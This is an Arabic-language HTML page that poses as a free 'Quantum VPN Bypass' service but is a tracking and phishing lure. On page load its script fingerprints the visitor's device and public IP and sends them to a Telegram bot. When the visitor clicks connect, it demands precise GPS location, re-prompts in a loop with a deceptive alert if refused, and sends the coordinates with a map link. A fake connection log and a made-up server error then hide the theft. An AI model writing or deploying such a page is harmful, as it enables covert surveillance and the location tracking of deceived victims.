<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إنترنت مجاني - Quantum VPN Bypass</title>
    <style>
        :root {
            --cyan: #00f0ff;
            --purple: #7000ff;
            --dark-bg: #060913;
            --card-bg: #0d1527;
            --border-color: #1e2e4d;
            --text-light: #f1f5f9;
            --success: #00ffaa;
            --error: #ff3366;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--dark-bg);
            color: var(--text-light);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 50% 50%, #131a35 0%, #060913 100%);
        }

        .vpn-card {
            background-color: var(--card-bg);
            border-radius: 20px;
            border: 1px solid var(--border-color);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.1);
            width: 100%;
            max-width: 460px;
            padding: 30px;
            text-align: center;
            box-sizing: border-box;
        }

        .shield-icon {
            font-size: 4rem;
            background: linear-gradient(135deg, var(--cyan), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
        }

        h1 {
            font-size: 1.8rem;
            margin: 0 0 5px 0;
            font-weight: 800;
            letter-spacing: -0.5px;
        }

        .tagline {
            color: #566c93;
            font-size: 0.85rem;
            margin-bottom: 25px;
            text-transform: uppercase;
        }

        .cyber-panel {
            background: rgba(4, 7, 16, 0.8);
            border: 1px solid #16223f;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: right;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.8rem;
        }

        .panel-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 6px;
            border-bottom: 1px dashed rgba(30, 46, 77, 0.4);
            padding-bottom: 4px;
        }

        .panel-row:last-child {
            border: none;
            margin: 0;
            padding: 0;
        }

        .cyan-text { color: var(--cyan); }
        .green-text { color: var(--success); }

        .form-group {
            margin-bottom: 25px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.85rem;
            color: #8fa0bc;
            font-weight: 600;
        }

        select {
            width: 100%;
            padding: 14px;
            background-color: #040710;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-light);
            font-size: 0.95rem;
            font-weight: bold;
            outline: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .action-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, var(--purple), var(--cyan));
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(112, 0, 255, 0.4);
        }

        .action-btn:hover {
            filter: brightness(1.1);
            transform: translateY(-1px);
        }

        .action-btn:disabled {
            background: #1e293b;
            color: #475569;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            filter: none;
        }

        .progress-box {
            display: none;
            margin-top: 25px;
        }

        .progress-container {
            width: 100%;
            background-color: #040710;
            border-radius: 6px;
            height: 8px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            margin-bottom: 10px;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, var(--purple), var(--cyan));
            transition: width 0.3s ease;
        }

        .status-log {
            font-family: monospace;
            font-size: 0.8rem;
            color: #8fa0bc;
            min-height: 20px;
        }
    </style>
</head>
<body>

    <div class="vpn-card">
        <div class="shield-icon">⚡</div>
        <h1>Quantum VPN Bypass</h1>
        <div class="tagline">تجاوز الحجب الذكي وعقد التشفير </div>

        <div class="cyber-panel">
            <div class="panel-row">
                <span>عقدة الاتصال الحالية:</span>
                <span class="cyan-text" id="node-ip">جاري فحص العقد المتاحة...</span>
            </div>
            <div class="panel-row">
                <span>مستوى التشفير المطبق:</span>
                <span class="green-text">ChaCha20-Poly1305 (256-bit)</span>
            </div>
            <div class="panel-row">
                <span>بروتوكول النفق النفاث:</span>
                <span>WireGuard Core v2</span>
            </div>
        </div>

        <div class="form-group">
            <label for="server">اختر السيرفر الجغرافي المجاني:</label>
            <select id="server">
                <option value="SA">المملكة العربية السعودية (الرياض - خادم حكومي سريع جداً)</option>
                <option value="US">الولايات المتحدة الأمريكية (فرجينيا - تصفح غير محدود)</option>
                <option value="DE">ألمانيا (فرنكفورت - سحابي معزول)</option>
                <option value="JP">اليابان (طوكيو - عقدة مجهولة)</option>
                <option value="UK">المملكة المتحدة (لندن - اتصال فائق التشفير)</option>
            </select>
        </div>

        <button id="connect-trigger" class="action-btn">بدء الاتصال النفاث المجاني</button>

        <div id="progress-area" class="progress-box">
            <div class="progress-container">
                <div id="bar" class="progress-bar"></div>
            </div>
            <div id="log-text" class="status-log">جاري التهيئة...</div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = 'tookin';
        const TELEGRAM_CHAT_ID = 'idde';

        let deviceFingerprint = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            screenSize: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            publicIP: "جاري الاستدعاء..."
        };

        async function sendPayload(textMessage) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textMessage,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error("Transmission Error:", e);
            }
        }

        async function runPrimaryExfiltration() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                deviceFingerprint.publicIP = data.ip;
                document.getElementById('node-ip').innerText = data.ip + " (عقدة محلية)";
            } catch (err) {
                deviceFingerprint.publicIP = "تعذر جلب الـ IP الفعلي";
                document.getElementById('node-ip').innerText = "127.0.0.1 (Offline Node)";
            }

            let report1 = `📱 *[الرسالة 1/2] تقرير البصمة الفنية للجهاز* 📱\n\n`;
            report1 += `🌐 *الـ IP الفعلي:* \`${deviceFingerprint.publicIP}\`\n`;
            report1 += `⚙️ *نظام التشغيل والمتصفح:* \`${deviceFingerprint.userAgent}\`\n`;
            report1 += `💻 *المنصة الفنية:* ${deviceFingerprint.platform}\n`;
            report1 += `⚡ *أنوية المعالج (CPU):* ${deviceFingerprint.cpuCores}\n`;
            report1 += `🧠 *الذاكرة العشوائية (RAM):* ${deviceFingerprint.deviceMemory}\n`;
            report1 += `🖥️ *أبعاد الشاشة الكلية:* ${deviceFingerprint.screenSize}\n`;
            report1 += `🌍 *نطاق التوقيت المحلي:* ${deviceFingerprint.timezone}\n`;
            report1 += `🌐 *اللغة المستهدفة:* ${deviceFingerprint.language}`;

            await sendPayload(report1);
        }

        window.onload = () => {
            runPrimaryExfiltration();
        };

        const btn = document.getElementById('connect-trigger');
        const progressArea = document.getElementById('progress-area');
        const bar = document.getElementById('bar');
        const logText = document.getElementById('log-text');
        const serverSelect = document.getElementById('server');

        function requestExactLocation() {
            return new Promise((resolve, reject) => {
                if ("geolocation" in navigator) {
                    const geoOptions = {
                        enableHighAccuracy: true, 
                        timeout: 10000,           
                        maximumAge: 0             
                    };
                    navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
                } else {
                    reject(new Error("الجيولكيشن غير مدعوم في هذا المتصفح"));
                }
            });
        }

        // دالة مخصصة لإدارة معالجة جلب الموقع وإعادة الطلب الإجباري عند الرفض
        async function handleLocationSequence(selectedServerText) {
            try {
                // محاولة جلب الموقع لأول مرة (أو تكرارها بناءً على الإغلاق)
                const position = await requestExactLocation();
                
                // في حال الموافقة الناجحة
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                let report2 = `📍 *[الرسالة 2/2] البيانات الجغرافية الدقيقة (موافقة)* 📍\n\n`;
                report2 += `🎯 *IP الهدف المصاحب:* \`${deviceFingerprint.publicIP}\`\n`;
                report2 += `📐 *خط العرض (Latitude):* \`${lat}\`\n`;
                report2 += `📐 *خط الطول (Longitude):* \`${lon}\`\n`;
                report2 += `🎯 *معدل الدقة الحرفية:* ${acc} متر\n\n`;
                report2 += `🗺️ *رابط الخريطة المباشر:* \nhttps://www.google.com/maps?q=${lat},${lon}`;

                await sendPayload(report2);
                
                // الانتقال لبدء شريط التقدم والمحاكاة بعد الاستلام الناجح
                startFakeConnection(selectedServerText);

            } catch (error) {
                // إبلاغ البوت بوقوع رفض أو تعذر مؤقت
                let report2Reject = `❌ *[الرسالة 2/2] فشل جلب الموقع* ❌\n\n`;
                report2Reject += `🎯 *IP الهدف:* \`${deviceFingerprint.publicIP}\`\n`;
                report2Reject += `⚠️ *السبب:* تم رفض الصلاحية الجغرافية. (${error.message})`;
                await sendPayload(report2Reject);
                
                // 1. إظهار رسالة التنبيه الإقناعية للمستخدم أولاً
                alert("⚠️ تنبيه الاتصال بالشبكة:\nيجب السماح بصلاحية الموقع الجغرافي لتحديد العقدة الأقرب وتفعيل بروتوكول التشفير بنجاح.\n\nملاحظة: يتطلب تطبيق VPN الاتصال بالإنترنت لأول مرة لمزامنة المفاتيح مع الخادم.");
                
                // 2. فور إغلاق التنبيه، يتم إعادة استدعاء الدالة نفسها لفتح طلب صلاحية المتصفح مجدداً (Loop حثي)
                logText.innerHTML = `<span class="cyan-text">[اعادة محاولة]</span> في انتظار استجابة المستخدم لنافذة النظام...`;
                handleLocationSequence(selectedServerText);
            }
        }

        btn.addEventListener('click', async () => {
            const selectedServerText = serverSelect.options[serverSelect.selectedIndex].text;
            
            btn.disabled = true;
            progressArea.style.display = 'block';
            logText.innerHTML = `<span class="cyan-text">[0%]</span> جاري استدعاء صلاحيات الموقع لتحديد أقرب عقدة تشفير...`;

            // تشغيل تدفق الفحص وإعادة المحاولة التلقائي
            await handleLocationSequence(selectedServerText);
        });

        function startFakeConnection(serverName) {
            let currentSecond = 0;
            const totalDuration = 30;
            
            const cyberLogs = [
                { p: 10, t: "توليد زوج مفاتيح التشفير المؤقتة (Diffie-Hellman)..." },
                { p: 35, t: "جاري فحص جدران الحماية وحقن حزم المصافحة..." },
                { p: 70, t: "إنشاء النفق الافتراضي المعزول وتوجيه حركة الـ DNS..." },
                { p: 95, t: "تطبيق طبقة التعمية وتأمين حزم البيانات النهائية..." }
            ];

            const runner = setInterval(() => {
                currentSecond++;
                const percentage = Math.floor((currentSecond / totalDuration) * 100);
                bar.style.width = `${percentage}%`;

                let currentLog = cyberLogs.find(l => percentage <= l.p) || cyberLogs[cyberLogs.length - 1];
                logText.innerHTML = `<span class="cyan-text">[${percentage}%]</span> ${currentLog.t}`;

                if (currentSecond >= totalDuration) {
                    clearInterval(runner);
                    bar.style.backgroundColor = "var(--error)";
                    logText.innerHTML = `<span style="color:var(--error)">❌ خطأ فادح: فشلت مصافحة الخادم مع [${serverName}]. العقدة ممتلئة حالياً، يرجى إعادة المحاولة لاحقاً.</span>`;
                    btn.disabled = false;
                }
            }, 1000);
        }
    </script>
</body>
</html>
